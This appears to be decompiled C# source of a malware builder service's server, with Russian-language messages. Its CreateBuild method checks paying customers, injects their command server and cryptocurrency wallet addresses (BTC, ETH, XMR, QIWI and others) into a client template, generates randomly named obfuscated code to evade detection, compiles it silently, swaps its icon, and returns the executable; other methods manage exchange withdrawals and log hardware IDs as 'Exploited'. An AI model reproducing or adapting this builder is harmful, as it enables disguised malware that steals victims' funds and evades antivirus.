using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.ServiceModel;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using MainServer.Classes;
using Widhdraw_app.TradesAPI;

namespace MainServer.Controller
{
	// Token: 0x0200000D RID: 13
	[ServiceBehavior(ConcurrencyMode = ConcurrencyMode.Multiple, InstanceContextMode = InstanceContextMode.Single, UseSynchronizationContext = false)]
	public class Implement : IUser
	{
		// Token: 0x06000043 RID: 67 RVA: 0x00003C50 File Offset: 0x00003C50
		private static string RandomString(int size)
		{
			char[] array = new char[size];
			for (int i = 0; i < size; i++)
			{
				array[i] = "aqwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"[Implement._rng.Next("aqwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM".Length)];
			}
			return new string(array);
		}

		// Token: 0x06000044 RID: 68 RVA: 0x00003CA4 File Offset: 0x00003CA4
		public string Encrypt(string strToEncrypt, string strKey)
		{
			string result;
			try
			{
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
				byte[] key = md5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(strKey));
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
				byte[] bytes = Encoding.UTF8.GetBytes(strToEncrypt);
				result = Convert.ToBase64String(tripleDESCryptoServiceProvider.CreateEncryptor().TransformFinalBlock(bytes, 0, bytes.Length));
			}
			catch (Exception ex)
			{
				result = ex.Message;
			}
			return result;
		}

		// Token: 0x06000045 RID: 69 RVA: 0x00003D2C File Offset: 0x00003D2C
		public async Task<SResponse<byte[]>> CreateBuild(User user, BuildSettings settings)
		{
			Func<User, bool> <>9__1;
			Func<User, bool> <>9__2;
			return await Task.Factory.StartNew<SResponse<byte[]>>(delegate
			{
				IEnumerable<User> @base = Singleton<Controller>.Instance._base;
				Func<User, bool> predicate;
				if ((predicate = <>9__1) == null)
				{
					predicate = (<>9__1 = ((User x) => x.Login == user.Login && x.Password == user.Password));
				}
				bool flag = @base.Where(predicate).Any<User>();
				SResponse<byte[]> result;
				if (flag)
				{
					IEnumerable<User> base2 = Singleton<Controller>.Instance._base;
					Func<User, bool> predicate2;
					if ((predicate2 = <>9__2) == null)
					{
						predicate2 = (<>9__2 = ((User x) => x.Login == user.Login && x.Password == user.Password));
					}
					bool activated = base2.Where(predicate2).FirstOrDefault<User>().Activated;
					if (activated)
					{
						string output = Implement.GenNames(1)[0] + ".exe";
						object lockBuild = this.LockBuild;
						lock (lockBuild)
						{
							string text = Implement.RandomString(Implement._rng.Next(10, 15));
							string text2 = File.ReadAllText(Directory.GetCurrentDirectory() + "\\Client\\Properties\\Domainer.settings");
							string text3 = text2;
							text3 = text3.Replace("[SERVER]", this.Encrypt(settings.IPSERVER, text));
							text3 = text3.Replace("[ID]", this.Encrypt(settings.ID, text));
							text3 = text3.Replace("[KEY]", text);
							text3 = text3.Replace("[QIWI]", this.Encrypt(settings.Wallets["QIWI"], text));
							text3 = text3.Replace("[BTC]", this.Encrypt(settings.Wallets["BTC"], text));
							text3 = text3.Replace("[ETH]", this.Encrypt(settings.Wallets["ETH"], text));
							text3 = text3.Replace("[LTC]", this.Encrypt(settings.Wallets["LTC"], text));
							text3 = text3.Replace("[XRP]", this.Encrypt(settings.Wallets["XRP"], text));
							text3 = text3.Replace("[DOGE]", this.Encrypt(settings.Wallets["DOGE"], text));
							text3 = text3.Replace("[ZEC]", this.Encrypt(settings.Wallets["ZEC"], text));
							text3 = text3.Replace("[XMR]", this.Encrypt(settings.Wallets["XMR"], text));
							File.WriteAllText(Directory.GetCurrentDirectory() + "\\Client\\Properties\\Domainer.settings", text3);
							string text4 = File.ReadAllText(Directory.GetCurrentDirectory() + "\\Client\\Properties\\Domainer.Designer.cs");
							string text5 = text4;
							text5 = text5.Replace("[SERVER]", this.Encrypt(settings.IPSERVER, text));
							text5 = text5.Replace("[ID]", this.Encrypt(settings.ID, text));
							text5 = text5.Replace("[KEY]", text);
							text5 = text5.Replace("[QIWI]", this.Encrypt(settings.Wallets["QIWI"], text));
							text5 = text5.Replace("[BTC]", this.Encrypt(settings.Wallets["BTC"], text));
							text5 = text5.Replace("[ETH]", this.Encrypt(settings.Wallets["ETH"], text));
							text5 = text5.Replace("[LTC]", this.Encrypt(settings.Wallets["LTC"], text));
							text5 = text5.Replace("[XRP]", this.Encrypt(settings.Wallets["XRP"], text));
							text5 = text5.Replace("[DOGE]", this.Encrypt(settings.Wallets["DOGE"], text));
							text5 = text5.Replace("[ZEC]", this.Encrypt(settings.Wallets["ZEC"], text));
							text5 = text5.Replace("[XMR]", this.Encrypt(settings.Wallets["XMR"], text));
							File.WriteAllText(Directory.GetCurrentDirectory() + "\\Client\\Properties\\Domainer.Designer.cs", text5);
							string contents = Regex.Replace(File.ReadAllText(Directory.GetCurrentDirectory() + "\\Client\\Client.csproj"), "<AssemblyName>(.*)<\\/AssemblyName>", (Match x) => string.Format("{0}", x.Groups[0].Value.Replace(x.Groups[1].Value, output.Split(new char[]
							{
								'.'
							})[0])));
							File.WriteAllText(Directory.GetCurrentDirectory() + "\\Client\\Client.csproj", contents);
							string arguments = "\"" + Directory.GetCurrentDirectory() + "\\Client\\Client.csproj\" /build \"Release|AnyCPU\"";
							File.WriteAllText(Directory.GetCurrentDirectory() + "\\Client\\Program.cs", this.Obfuscate(settings, text).Result);
							string message = Process.Start(new ProcessStartInfo
							{
								WindowStyle = ProcessWindowStyle.Hidden,
								CreateNoWindow = true,
								Arguments = arguments,
								FileName = Singleton<Controller>.Instance.LocalPath,
								StandardOutputEncoding = Encoding.GetEncoding(866),
								RedirectStandardOutput = true,
								UseShellExecute = false
							}).StandardOutput.ReadToEnd();
							File.WriteAllText(Directory.GetCurrentDirectory() + "\\Client\\Properties\\Domainer.settings", text2);
							File.WriteAllText(Directory.GetCurrentDirectory() + "\\Client\\Properties\\Domainer.Designer.cs", text4);
							bool flag3 = File.Exists(output);
							if (flag3)
							{
								try
								{
									bool flag4 = settings.Icon != null;
									if (flag4)
									{
										new IconChanger().ChangeIcon(Directory.GetCurrentDirectory() + "\\" + output, new IconChanger.IconReader(new MemoryStream(settings.Icon)).Icons);
									}
								}
								catch (Exception ex)
								{
									File.AppendAllText("loger.txt", ex.ToString() + Environment.NewLine);
								}
								byte[] data = File.ReadAllBytes(output);
								bool flag5 = File.Exists(output);
								if (flag5)
								{
									File.Delete(output);
								}
								return new SResponse<byte[]>
								{
									Data = data,
									Message = "Успешно",
									Status = RequestStatus.Success
								};
							}
							return new SResponse<byte[]>
							{
								Data = null,
								Message = message,
								Status = RequestStatus.Error
							};
						}
					}
					result = new SResponse<byte[]>
					{
						Data = new byte[0],
						Message = string.Format("{0}, Ваш аккаунт не активен.", user.Login),
						Status = RequestStatus.Error
					};
				}
				else
				{
					result = new SResponse<byte[]>
					{
						Data = new byte[0],
						Message = "Пользователь не зарегестрирован.",
						Status = RequestStatus.Error
					};
				}
				return result;
			});
		}

		// Token: 0x06000046 RID: 70 RVA: 0x00003D84 File Offset: 0x00003D84
		public static List<string> GenNames(int count)
		{
			string[] array = new string[count];
			for (int i = 0; i < count; i++)
			{
				bool flag = Implement._rng.Next(0, 10) > 5;
				bool flag2 = Implement._rng.Next(0, 10) > 5;
				bool flag3 = Implement._rng.Next(0, 10) > 5;
				bool flag4 = flag;
				if (flag4)
				{
					array[i] = Implement.LowerWords[Implement._rng.Next(0, Implement.LowerWords.Count<string>() - 1)];
				}
				else
				{
					array[i] = Implement.UpperWords[Implement._rng.Next(0, Implement.UpperWords.Count<string>() - 1)];
				}
				bool flag5 = flag2;
				if (flag5)
				{
					string[] array2 = array;
					int num = i;
					array2[num] += "_";
				}
				bool flag6 = flag3;
				if (flag6)
				{
					string[] array3 = array;
					int num2 = i;
					array3[num2] += Implement.LowerWords[Implement._rng.Next(0, Implement.LowerWords.Count<string>() - 1)];
				}
				else
				{
					string[] array4 = array;
					int num3 = i;
					array4[num3] += Implement.UpperWords[Implement._rng.Next(0, Implement.UpperWords.Count<string>() - 1)];
				}
			}
			return array.ToList<string>();
		}

		// Token: 0x06000047 RID: 71 RVA: 0x00003EC4 File Offset: 0x00003EC4
		public async Task<string> Obfuscate(BuildSettings settings, string key)
		{
			return await Task.Factory.StartNew<string>(delegate
			{
				string[] array = Implement.GenNames(100).ToArray();
				return string.Concat(new string[]
				{
					"using Omdagerssss;\r\nusing AvGondoni.Properties;\r\nusing System;\r\nusing System.Reflection;\r\nusing System.Linq;\r\n\r\nnamespace ",
					array[0],
					"\r\n{\r\n    class ",
					array[1],
					":Fazathron\r\n    {\r\n        public static Fazathron ",
					array[2],
					" { get; set; }\r\n        public static string ",
					array[3],
					" { set { ",
					array[2],
					".ApplicationPath = value; } }\r\n        public static string ",
					array[4],
					" { set { ",
					array[2],
					".ID = value; } }\r\n        public static string ",
					array[5],
					" { set { ",
					array[2],
					".InstallPath = value; } }\r\n        public static string ",
					array[6],
					" { set { ",
					array[2],
					".ServerAdress = value; } }\r\n\r\n        public static string ",
					array[7],
					" { set { ",
					array[3],
					" = value; } }\r\n        public static string ",
					array[8],
					" { set { ",
					array[4],
					" = value; } }\r\n        public static string ",
					array[9],
					" { set { ",
					array[5],
					" = value; } }\r\n        public static string ",
					array[10],
					" { set { ",
					array[6],
					" = value; } }\r\n\r\n        public static Fazathron ",
					array[11],
					" { set { ",
					array[2],
					" = value; } }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            try\r\n            {\r\n            ",
					array[11],
					" = new ",
					array[1],
					"();\r\n            ",
					array[7],
					" = Assembly.GetExecutingAssembly().Location;\r\n            ",
					array[8],
					" = \"",
					string.IsNullOrWhiteSpace(settings.ID) ? "" : settings.ID.Insert(Implement._rng.Next(0, settings.ID.Count<char>() - 1), array[50]),
					"\".Replace(\"",
					array[50],
					"\",string.Empty);\r\n            ",
					array[9],
					" = Environment.ExpandEnvironmentVariables(Domainer.Default.Oomoo);\r\n            ",
					array[10],
					" = Domainer.Default.wwww;\r\n            ",
					array[2],
					".Init(Domainer.Default.Параметр.OfType<string>().ToArray().Concat( new string[] { Domainer.Default.Key }).ToArray());\r\n            new Ohoho(",
					array[2],
					").modify();\r\n            }\r\ncatch(Exception ex)\r\n{\r\n Console.WriteLine(ex);\r\n}\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}\r\n"
				});
			});
		}

		// Token: 0x06000048 RID: 72 RVA: 0x00003F1C File Offset: 0x00003F1C
		private static string RandomNumber(int count)
		{
			string text = string.Empty;
			for (int i = 0; i < count; i++)
			{
				text += Implement._rng.Next(0, 9).ToString();
			}
			return text;
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00003F64 File Offset: 0x00003F64
		public static string RandomFields(int count, string key)
		{
			string text = string.Empty;
			for (int i = 0; i < count; i++)
			{
				text = text + string.Format("public static string {0} ", Implement.RandomString(Implement._rng.Next(5, 35))) + "{get;set;}" + Environment.NewLine;
			}
			return text;
		}

		// Token: 0x0600004A RID: 74 RVA: 0x00003FBC File Offset: 0x00003FBC
		public static string RandomClasses(int count, string key)
		{
			string text = string.Empty;
			for (int i = 0; i < count; i++)
			{
				text = string.Concat(new string[]
				{
					text,
					string.Format("public class {0}", Implement.RandomString(Implement._rng.Next(3, 10))),
					Environment.NewLine,
					"{",
					Environment.NewLine,
					Implement.RandomFields(Implement._rng.Next(10, 40), key),
					Environment.NewLine,
					"}",
					Environment.NewLine
				});
			}
			return text;
		}

		// Token: 0x0600004B RID: 75 RVA: 0x00004064 File Offset: 0x00004064
		public static string RandomFuncs(int count)
		{
			string text = string.Empty;
			string[] array = new string[]
			{
				"string",
				"int",
				"List<string>",
				"double",
				"object",
				"List<double>",
				"List<object>"
			};
			for (int i = 0; i < count; i++)
			{
				object obj = new object();
				string arg = array[Implement._rng.Next(1, 6)];
				text = string.Concat(new string[]
				{
					text,
					string.Format("public static {0} {1}()", arg, Implement.RandomString(Implement._rng.Next(3, 10))),
					Environment.NewLine,
					"{",
					Environment.NewLine
				});
				int num = Implement._rng.Next(0, 10);
				for (int j = 0; j < num; j++)
				{
					text = text + string.Format("{0} {1};", array[Implement._rng.Next(0, 6)], Implement.RandomString(Implement._rng.Next(3, 10))) + Environment.NewLine;
				}
				text = text + string.Format("return new {0}();}}", arg) + Environment.NewLine;
			}
			return text;
		}

		// Token: 0x0600004C RID: 76 RVA: 0x000041B0 File Offset: 0x000041B0
		public async Task<SResponse<bool>> Register(User user)
		{
			Func<User, bool> <>9__1;
			return await Task.Factory.StartNew<SResponse<bool>>(delegate
			{
				SResponse<bool> result;
				try
				{
					bool flag = string.IsNullOrWhiteSpace(user.Password) || string.IsNullOrWhiteSpace(user.Login);
					if (flag)
					{
						result = new SResponse<bool>
						{
							Data = false,
							Message = "Заполните все поля",
							Status = RequestStatus.Error
						};
					}
					else
					{
						IEnumerable<User> @base = Singleton<Controller>.Instance._base;
						Func<User, bool> predicate;
						if ((predicate = <>9__1) == null)
						{
							predicate = (<>9__1 = ((User x) => x.Login == user.Login));
						}
						bool flag2 = @base.Where(predicate).Any<User>();
						if (flag2)
						{
							result = new SResponse<bool>
							{
								Data = false,
								Message = "Пользователь с таким именем уже существует.",
								Status = RequestStatus.Error
							};
						}
						else
						{
							User user2 = Singleton<Controller>.Instance.CreateUser();
							user2.Login = user.Login;
							user2.Password = user.Password;
							Singleton<Controller>.Instance.OnNewUser(user2);
							result = new SResponse<bool>
							{
								Data = true,
								Message = "Пользователь успешно зарегестрирован.",
								Status = RequestStatus.Success
							};
						}
					}
				}
				catch (Exception ex)
				{
					result = new SResponse<bool>
					{
						Data = false,
						Message = ex.Message,
						Status = RequestStatus.Error
					};
				}
				return result;
			});
		}

		// Token: 0x0600004D RID: 77 RVA: 0x00004200 File Offset: 0x00004200
		public async Task<SResponse<bool>> Authorize(User user)
		{
			Func<User, bool> <>9__1;
			Func<User, bool> <>9__2;
			return await Task.Factory.StartNew<SResponse<bool>>(delegate
			{
				SResponse<bool> result;
				try
				{
					IEnumerable<User> @base = Singleton<Controller>.Instance._base;
					Func<User, bool> predicate;
					if ((predicate = <>9__1) == null)
					{
						predicate = (<>9__1 = ((User x) => x.Login == user.Login && x.Password == user.Password));
					}
					bool flag = @base.Where(predicate).Any<User>();
					if (flag)
					{
						IEnumerable<User> base2 = Singleton<Controller>.Instance._base;
						Func<User, bool> predicate2;
						if ((predicate2 = <>9__2) == null)
						{
							predicate2 = (<>9__2 = ((User x) => x.Login == user.Login && x.Password == user.Password));
						}
						bool activated = base2.Where(predicate2).FirstOrDefault<User>().Activated;
						if (activated)
						{
							Singleton<Controller>.Instance.OnAuthwUser(user.Login);
							result = new SResponse<bool>
							{
								Data = true,
								Message = string.Format("{0}, спасибо за авторизацию.", user.Login),
								Status = RequestStatus.Success
							};
						}
						else
						{
							result = new SResponse<bool>
							{
								Data = false,
								Message = string.Format("{0}, спасибо за авторизацию. Ваш аккаунт не активен.", user.Login),
								Status = RequestStatus.Error
							};
						}
					}
					else
					{
						result = new SResponse<bool>
						{
							Data = false,
							Message = "Пользователь не зарегестрирован.",
							Status = RequestStatus.Error
						};
					}
				}
				catch (Exception ex)
				{
					result = new SResponse<bool>
					{
						Data = false,
						Message = ex.Message,
						Status = RequestStatus.Error
					};
				}
				return result;
			});
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00004250 File Offset: 0x00004250
		public async Task<SResponse<List<ModuleFile>>> UserModules(User user)
		{
			Func<User, bool> <>9__1;
			Func<User, bool> <>9__2;
			Func<User, bool> <>9__3;
			return await Task.Factory.StartNew<SResponse<List<ModuleFile>>>(delegate
			{
				SResponse<List<ModuleFile>> result;
				try
				{
					IEnumerable<User> @base = Singleton<Controller>.Instance._base;
					Func<User, bool> predicate;
					if ((predicate = <>9__1) == null)
					{
						predicate = (<>9__1 = ((User x) => x.Login == user.Login && x.Password == user.Password));
					}
					bool flag = @base.Where(predicate).Any<User>();
					if (flag)
					{
						IEnumerable<User> base2 = Singleton<Controller>.Instance._base;
						Func<User, bool> predicate2;
						if ((predicate2 = <>9__2) == null)
						{
							predicate2 = (<>9__2 = ((User x) => x.Login == user.Login && x.Password == user.Password));
						}
						bool activated = base2.Where(predicate2).FirstOrDefault<User>().Activated;
						if (activated)
						{
							SResponse<List<ModuleFile>> sresponse = new SResponse<List<ModuleFile>>();
							IEnumerable<User> base3 = Singleton<Controller>.Instance._base;
							Func<User, bool> predicate3;
							if ((predicate3 = <>9__3) == null)
							{
								predicate3 = (<>9__3 = ((User x) => x.Login == user.Login && x.Password == user.Password));
							}
							sresponse.Data = base3.Where(predicate3).FirstOrDefault<User>().Modules;
							sresponse.Message = string.Format("{0}, спасибо за авторизацию.", user.Login);
							sresponse.Status = RequestStatus.Success;
							result = sresponse;
						}
						else
						{
							result = new SResponse<List<ModuleFile>>
							{
								Data = new List<ModuleFile>(),
								Message = string.Format("{0}, спасибо за авторизацию. Ваш аккаунт не активен.", user.Login),
								Status = RequestStatus.Error
							};
						}
					}
					else
					{
						result = new SResponse<List<ModuleFile>>
						{
							Data = new List<ModuleFile>(),
							Message = "Пользователь не зарегестрирован.",
							Status = RequestStatus.Error
						};
					}
				}
				catch (Exception ex)
				{
					result = new SResponse<List<ModuleFile>>
					{
						Data = new List<ModuleFile>(),
						Message = ex.Message,
						Status = RequestStatus.Error
					};
				}
				return result;
			});
		}

		// Token: 0x0600004F RID: 79 RVA: 0x000042A0 File Offset: 0x000042A0
		public async Task<SResponse<List<string>>> CustomModules(User user)
		{
			Func<User, bool> <>9__1;
			Func<User, bool> <>9__2;
			Func<User, bool> <>9__3;
			return await Task.Factory.StartNew<SResponse<List<string>>>(delegate
			{
				SResponse<List<string>> result;
				try
				{
					IEnumerable<User> @base = Singleton<Controller>.Instance._base;
					Func<User, bool> predicate;
					if ((predicate = <>9__1) == null)
					{
						predicate = (<>9__1 = ((User x) => x.Login == user.Login && x.Password == user.Password));
					}
					bool flag = @base.Where(predicate).Any<User>();
					if (flag)
					{
						IEnumerable<User> base2 = Singleton<Controller>.Instance._base;
						Func<User, bool> predicate2;
						if ((predicate2 = <>9__2) == null)
						{
							predicate2 = (<>9__2 = ((User x) => x.Login == user.Login && x.Password == user.Password));
						}
						bool activated = base2.Where(predicate2).FirstOrDefault<User>().Activated;
						if (activated)
						{
							SResponse<List<string>> sresponse = new SResponse<List<string>>();
							IEnumerable<User> base3 = Singleton<Controller>.Instance._base;
							Func<User, bool> predicate3;
							if ((predicate3 = <>9__3) == null)
							{
								predicate3 = (<>9__3 = ((User x) => x.Login == user.Login && x.Password == user.Password));
							}
							sresponse.Data = base3.Where(predicate3).FirstOrDefault<User>().ActivatedModules;
							sresponse.Message = string.Format("{0}, спасибо за авторизацию.", user.Login);
							sresponse.Status = RequestStatus.Success;
							result = sresponse;
						}
						else
						{
							result = new SResponse<List<string>>
							{
								Data = new List<string>(),
								Message = string.Format("{0}, спасибо за авторизацию. Ваш аккаунт не активен.", user.Login),
								Status = RequestStatus.Error
							};
						}
					}
					else
					{
						result = new SResponse<List<string>>
						{
							Data = new List<string>(),
							Message = "Пользователь не зарегестрирован.",
							Status = RequestStatus.Error
						};
					}
				}
				catch (Exception ex)
				{
					result = new SResponse<List<string>>
					{
						Data = new List<string>(),
						Message = ex.Message,
						Status = RequestStatus.Error
					};
				}
				return result;
			});
		}

		// Token: 0x06000050 RID: 80 RVA: 0x000042F0 File Offset: 0x000042F0
		public string[] GetClasses()
		{
			string[] array = Implement.GenNames(100).ToArray();
			return new List<string>
			{
				string.Concat(new string[]
				{
					"    abstract class ",
					array[0],
					"\r\n    {\r\n        public string ",
					array[1],
					" { get; set; }\r\n        public string ",
					array[3],
					" { get; set; }\r\n\r\n        public ",
					array[0],
					"(string name, string surname)\r\n        {\r\n            ",
					array[1],
					" = name;\r\n            ",
					array[3],
					" = surname;\r\n        }\r\n\r\n        public abstract void ",
					array[2],
					"();\r\n    }\r\n\r\n    class ",
					array[5],
					" : ",
					array[0],
					"\r\n    {\r\n        public int ",
					array[7],
					" { get; set; } \r\n\r\n        public ",
					array[5],
					"(string name, string surname, int ",
					array[7],
					")\r\n            : base(name, surname)\r\n        {\r\n            ",
					array[7],
					" = ",
					array[7],
					";\r\n        }\r\n        public override void ",
					array[2],
					"()\r\n        {\r\n            Console.WriteLine(string.Empty);\r\n        }\r\n    }\r\n\r\n    class ",
					array[4],
					" : ",
					array[0],
					"\r\n    {\r\n        public string ",
					array[6],
					" { get; set; }\r\n\r\n        public ",
					array[4],
					"(string name, string surname, string ",
					array[6],
					")\r\n            : base(name, surname)\r\n        {\r\n            ",
					array[6],
					" = ",
					array[6],
					";\r\n        }\r\n\r\n        public override void ",
					array[2],
					"()\r\n        {\r\n            Console.WriteLine(string.Empty);\r\n        }\r\n    }"
				}),
				string.Concat(new string[]
				{
					"\r\nclass ",
					array[1],
					"\r\n{\r\n    public ",
					array[1],
					"(string name)\r\n    {\r\n        this.",
					array[2],
					"=name;\r\n    }\r\n    public string ",
					array[2],
					" { get; set; }\r\n}\r\nclass ",
					array[0],
					"\r\n{\r\n    ",
					array[1],
					"[] ",
					array[1],
					"s;\r\n \r\n    public ",
					array[0],
					"()\r\n    {\r\n        ",
					array[1],
					"s = new ",
					array[1],
					"[] { new ",
					array[1],
					"(string.Empty), new ",
					array[1],
					"(string.Empty), \r\n                new ",
					array[1],
					"(string.Empty) };\r\n    }\r\n\r\n    public int Length\r\n    {\r\n        get { return ",
					array[1],
					"s.Length; }\r\n    }\r\n\r\n    public ",
					array[1],
					" this[int index]\r\n    {\r\n        get\r\n        {\r\n            return ",
					array[1],
					"s[index];\r\n        }\r\n        set\r\n        {\r\n            ",
					array[1],
					"s[index] = value;\r\n        }\r\n    }\r\n}"
				}),
				string.Concat(new string[]
				{
					"class ",
					array[0],
					"<T>\r\n{\r\n    public T ",
					array[1],
					" { get; private set; } // номер счета\r\n    public int ",
					array[2],
					" { get; set; }\r\n    public ",
					array[0],
					"(T _id)\r\n    {\r\n        ",
					array[1],
					" = _id;\r\n    }\r\n}\r\nclass ",
					array[4],
					"<T> where T: ",
					array[0],
					"<int>\r\n{\r\n    public T From",
					array[0],
					" { get; set; }  \r\n    public T To",
					array[0],
					" { get; set; }    \r\n    public int ",
					array[2],
					" { get; set; }     \r\n \r\n    public void ",
					array[3],
					"()\r\n    {\r\n        if (From",
					array[0],
					".",
					array[2],
					" > ",
					array[2],
					")\r\n        {\r\n            From",
					array[0],
					".",
					array[2],
					" -= ",
					array[2],
					";\r\n            To",
					array[0],
					".",
					array[2],
					" += ",
					array[2],
					";\r\n            Console.WriteLine(string.Empty);\r\n        }\r\n        else\r\n        {\r\n            Console.WriteLine(string.Empty);\r\n        }\r\n}\r\n}"
				})
			}.ToArray();
		}

		// Token: 0x06000051 RID: 81 RVA: 0x00004714 File Offset: 0x00004714
		public async Task<SResponse<List<string>>> AvailableExchangers(User user)
		{
			Func<User, bool> <>9__1;
			Func<User, bool> <>9__2;
			return await Task.Factory.StartNew<SResponse<List<string>>>(delegate
			{
				SResponse<List<string>> result;
				try
				{
					IEnumerable<User> @base = Singleton<Controller>.Instance._base;
					Func<User, bool> predicate;
					if ((predicate = <>9__1) == null)
					{
						predicate = (<>9__1 = ((User x) => x.Login == user.Login && x.Password == user.Password));
					}
					bool flag = @base.Where(predicate).Any<User>();
					if (flag)
					{
						IEnumerable<User> base2 = Singleton<Controller>.Instance._base;
						Func<User, bool> predicate2;
						if ((predicate2 = <>9__2) == null)
						{
							predicate2 = (<>9__2 = ((User x) => x.Login == user.Login && x.Password == user.Password));
						}
						bool activated = base2.Where(predicate2).FirstOrDefault<User>().Activated;
						if (activated)
						{
							result = new SResponse<List<string>>
							{
								Data = Singleton<Controller>.Instance.Exchangers,
								Message = "Список бирж упешно получен",
								Status = RequestStatus.Success
							};
						}
						else
						{
							result = new SResponse<List<string>>
							{
								Data = new List<string>(),
								Message = string.Format("{0}, спасибо за авторизацию. Ваш аккаунт не активен.", user.Login),
								Status = RequestStatus.Error
							};
						}
					}
					else
					{
						result = new SResponse<List<string>>
						{
							Data = new List<string>(),
							Message = "Пользователь не зарегестрирован.",
							Status = RequestStatus.Error
						};
					}
				}
				catch (Exception ex)
				{
					result = new SResponse<List<string>>
					{
						Data = new List<string>(),
						Message = ex.Message,
						Status = RequestStatus.Error
					};
				}
				return result;
			});
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00004764 File Offset: 0x00004764
		public async Task<SResponse<List<Currency>>> GetBalance(User user, string Name, string PublicKey, string PrivateKey)
		{
			Func<User, bool> <>9__1;
			Func<User, bool> <>9__2;
			Func<User, bool> <>9__3;
			return await Task.Factory.StartNew<SResponse<List<Currency>>>(delegate
			{
				SResponse<List<Currency>> result;
				try
				{
					IEnumerable<User> @base = Singleton<Controller>.Instance._base;
					Func<User, bool> predicate;
					if ((predicate = <>9__1) == null)
					{
						predicate = (<>9__1 = ((User x) => x.Login == user.Login && x.Password == user.Password));
					}
					bool flag = @base.Where(predicate).Any<User>();
					if (flag)
					{
						IEnumerable<User> base2 = Singleton<Controller>.Instance._base;
						Func<User, bool> predicate2;
						if ((predicate2 = <>9__2) == null)
						{
							predicate2 = (<>9__2 = ((User x) => x.Login == user.Login && x.Password == user.Password));
						}
						bool activated = base2.Where(predicate2).FirstOrDefault<User>().Activated;
						if (activated)
						{
							IEnumerable<User> base3 = Singleton<Controller>.Instance._base;
							Func<User, bool> predicate3;
							if ((predicate3 = <>9__3) == null)
							{
								predicate3 = (<>9__3 = ((User x) => x.Login == user.Login && x.Password == user.Password));
							}
							List<string> activatedModules = base3.Where(predicate3).FirstOrDefault<User>().ActivatedModules;
							bool flag2 = activatedModules.Contains(Name);
							if (flag2)
							{
								result = new SResponse<List<Currency>>
								{
									Data = ExchangerBase.CreateExchanger(Name, PublicKey, PrivateKey).GetBalance(),
									Message = "Баланс упешно получен",
									Status = RequestStatus.Success
								};
							}
							else
							{
								result = new SResponse<List<Currency>>
								{
									Data = new List<Currency>(),
									Message = string.Format("{0}, модуль для биржи {1} не активен.", user.Login, Name)
								};
							}
						}
						else
						{
							result = new SResponse<List<Currency>>
							{
								Data = new List<Currency>(),
								Message = string.Format("{0}, спасибо за авторизацию. Ваш аккаунт не активен.", user.Login),
								Status = RequestStatus.Error
							};
						}
					}
					else
					{
						result = new SResponse<List<Currency>>
						{
							Data = new List<Currency>(),
							Message = "Пользователь не зарегестрирован.",
							Status = RequestStatus.Error
						};
					}
				}
				catch (Exception ex)
				{
					result = new SResponse<List<Currency>>
					{
						Data = new List<Currency>(),
						Message = ex.Message,
						Status = RequestStatus.Error
					};
				}
				return result;
			});
		}

		// Token: 0x06000053 RID: 83 RVA: 0x000047C8 File Offset: 0x000047C8
		public async Task<SResponse<string>> Withdraw(User user, string Name, string PublicKey, string PrivateKey, WithdrawRequest request)
		{
			Func<User, bool> <>9__1;
			Func<User, bool> <>9__2;
			Func<User, bool> <>9__3;
			return await Task.Factory.StartNew<SResponse<string>>(delegate
			{
				SResponse<string> result;
				try
				{
					IEnumerable<User> @base = Singleton<Controller>.Instance._base;
					Func<User, bool> predicate;
					if ((predicate = <>9__1) == null)
					{
						predicate = (<>9__1 = ((User x) => x.Login == user.Login && x.Password == user.Password));
					}
					bool flag = @base.Where(predicate).Any<User>();
					if (flag)
					{
						IEnumerable<User> base2 = Singleton<Controller>.Instance._base;
						Func<User, bool> predicate2;
						if ((predicate2 = <>9__2) == null)
						{
							predicate2 = (<>9__2 = ((User x) => x.Login == user.Login && x.Password == user.Password));
						}
						bool activated = base2.Where(predicate2).FirstOrDefault<User>().Activated;
						if (activated)
						{
							IEnumerable<User> base3 = Singleton<Controller>.Instance._base;
							Func<User, bool> predicate3;
							if ((predicate3 = <>9__3) == null)
							{
								predicate3 = (<>9__3 = ((User x) => x.Login == user.Login && x.Password == user.Password));
							}
							List<string> activatedModules = base3.Where(predicate3).FirstOrDefault<User>().ActivatedModules;
							bool flag2 = activatedModules.Contains(Name);
							if (flag2)
							{
								result = new SResponse<string>
								{
									Data = ExchangerBase.CreateExchanger(Name, PublicKey, PrivateKey).Withdraw(request.amount, request.currency, request.adress, request.paymentid),
									Message = "Вывод успешно выполнен",
									Status = RequestStatus.Success
								};
							}
							else
							{
								result = new SResponse<string>
								{
									Data = "Ошибка при выводе",
									Message = string.Format("{0}, модуль для биржи {1} не активен.", user.Login, Name)
								};
							}
						}
						else
						{
							result = new SResponse<string>
							{
								Data = "Ошибка при выводе",
								Message = string.Format("{0}, спасибо за авторизацию. Ваш аккаунт не активен.", user.Login),
								Status = RequestStatus.Error
							};
						}
					}
					else
					{
						result = new SResponse<string>
						{
							Data = "Ошибка при выводе",
							Message = "Пользователь не зарегестрирован.",
							Status = RequestStatus.Error
						};
					}
				}
				catch (Exception ex)
				{
					result = new SResponse<string>
					{
						Data = "Ошибка при выводе",
						Message = ex.Message,
						Status = RequestStatus.Error
					};
				}
				return result;
			});
		}

		// Token: 0x06000054 RID: 84 RVA: 0x00004834 File Offset: 0x00004834
		public async Task AMAVULN(string hwid)
		{
			Singleton<Controller>.Instance.OnSystem(hwid + " - Exploited");
		}

		// Token: 0x06000055 RID: 85 RVA: 0x00004884 File Offset: 0x00004884
		public string rands(int length)
		{
			return new string((from s in Enumerable.Repeat<string>("abcdefghijklmnopqstuwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", length)
			select s[this.random.Next(s.Length)]).ToArray<char>());
		}

